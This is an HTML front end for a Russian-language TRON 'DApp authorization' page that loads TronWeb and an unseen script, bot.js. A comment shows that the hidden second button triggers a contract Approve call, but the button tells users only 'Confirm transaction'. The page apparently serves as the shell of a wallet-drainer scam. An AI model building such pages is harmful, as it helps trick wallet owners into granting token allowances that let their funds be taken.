<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подключение кошелька TRON</title>
    <!-- Подключаем официальную библиотеку TronWeb для работы с сетью Tron -->
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f4f4f9;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            background: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
        }
        button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 15px;
            width: 100%;
        }
        button:hover {
            background-color: #0056b3;
        }
        #transferBtn {
            background-color: #28a745;
            display: none; /* Скрыта до подключения */
        }
        #transferBtn:hover {
            background-color: #218838;
        }
        #walletAddress {
            margin-top: 20px;
            font-size: 14px;
            word-break: break-all;
            color: #333;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>DApp Авторизация</h2>
        <p id="walletAddress">Кошелек не подключен</p>
        
        <!-- Кнопка подключения -->
        <button id="connectBtn">Подключить кошелек</button>
        
        <!-- Кнопка вызова функции контракта (Approve) -->
        <button id="transferBtn">Подтвердить транзакцию</button>
    </div>

    <!-- Подключаем ваш скрипт логики -->
    <script src="bot.js"></script>
</body>
</html>
